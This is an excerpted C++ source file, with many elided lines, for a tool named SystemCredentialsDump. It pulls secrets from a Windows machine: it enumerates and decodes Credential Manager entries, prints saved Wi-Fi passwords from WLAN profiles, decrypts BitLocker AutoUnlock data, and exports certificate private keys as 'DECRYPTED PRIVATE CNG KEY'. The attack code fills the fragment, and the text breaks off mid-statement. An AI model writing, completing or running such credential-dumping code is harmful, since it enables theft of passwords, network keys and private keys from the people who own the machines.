...
namespace SystemCredentialsDump {
        ...
        if (CredEnumerateW(NULL, 0, &count, &pcredentials)) {
            ...
            for (DWORD i = 0; i < count; ++i) {
                ...
                if (cred->CredentialBlobSize > 0 && cred->CredentialBlob) {
                    ...
                    if (blobSize >= 2 && blobSize % 2 == 0) {
                        std::wstring secret(reinterpret_cast<wchar_t*>(blob),
    ...
    // ---------- 2. WI-FI ----------
    inline std::wstring GetXmlTagValue(const std::wstring& xml,
    ...
    inline void DumpWifiPasswords() {
        ...
        if (WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient) != ERROR_SUCCESS) {
            std::cout << "[!] Failure to open WLAN API.\n";
            return;
        }
        ...
        std::cout << "\n=== Automatic Wi-Fi passwords extraction ===\n";
        ...
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
            ...
            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
                ...
                if (WlanGetProfile(hClient, &pIfInfo->InterfaceGuid,
                                   pProfile->strProfileName, NULL, &pstrXml,
                                   &dwFlags, &dwGrantedAccess) == ERROR_SUCCESS && pstrXml) {
                    std::wstring xmlData(pstrXml);
                    std::wstring keyMaterial = GetXmlTagValue(xmlData,
                                                              L"<keyMaterial>",
                                                              L"</keyMaterial>");
                    std::cout << "----------------------------------------\n";
                    std::cout << "SSID / Profile: " << WStringToString(pProfile->strProfileName) << "\n";
                    if (!keyMaterial.empty())
                        std::cout << "Wi-Fi Password: " << WStringToString(keyMaterial) << "\n";
                    else
                        std::cout << "Wi-Fi Password: (Absence or EAP-Enterprise)\n";
            ...
            if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL,
                ...
                for (DWORD i = 0; i < dataOut.cbData; ++i)
                    std::cout << std::hex << std::setw(2) << std::setfill('0')
                              << (int)dataOut.pbData[i] << " ";
                std::cout << std::dec << "\n\n";
                LocalFree(dataOut.pbData);
            }
        }
        if (!foundAny) std::cout << "[-] No AutoUnlock volumes found.\n";
        RegCloseKey(hKey);
    }

    // ---------- 4. CERTYFIKATY ----------
    inline std::string BytesToPem(const BYTE* data, DWORD size,
    ...
    inline void ExportPrivateKeyPem(PCCERT_CONTEXT pCertContext) {
        ...
        if (!CryptAcquireCertificatePrivateKey(pCertContext,
                ...
                &hKeySpec, &dwKeySpec, &fCallerFree)) {
        ...
        if (dwKeySpec == CERT_NKEY_SPEC) {
            ...
            DWORD dwBlobLen = 0;
            if (NCryptExportKey(hNcryptKey, NULL, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
                                NULL, NULL, 0, &dwBlobLen, 0) == ERROR_SUCCESS) {
                std::vector<BYTE> keyBlob(dwBlobLen);
                if (NCryptExportKey(hNcryptKey, NULL, NCRYPT_PKCS8_PRIVATE_KEY_BLOB,
                                    NULL, keyBlob.data(), dwBlobLen, &dwBlobLen, 0) == ERROR_SUCCESS) {
                    std::cout << "\n--- DECRYPTED PRIVATE CNG KEY ---\n"
